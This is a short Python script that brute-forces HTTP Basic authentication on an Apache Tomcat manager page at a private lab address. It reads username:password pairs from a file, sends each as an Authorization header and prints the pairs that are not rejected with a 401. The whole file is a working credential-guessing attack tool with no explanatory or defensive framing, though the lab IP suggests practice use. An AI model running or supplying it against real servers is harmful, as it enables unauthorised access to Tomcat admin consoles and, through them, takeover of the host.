import requests
import base64

url ="http://10.0.2.7:8180/manager/html"

f = open("user_password.txt","r")


print("Username:Password(Found)")
for info in f:

	encoded = base64.b64encode(info.strip().encode())

	headers ={"Authorization":"Basic "+encoded.decode()}	
	response = requests.get(url, headers=headers)

	if int(response.status_code) != 401:
		print(info.strip()) 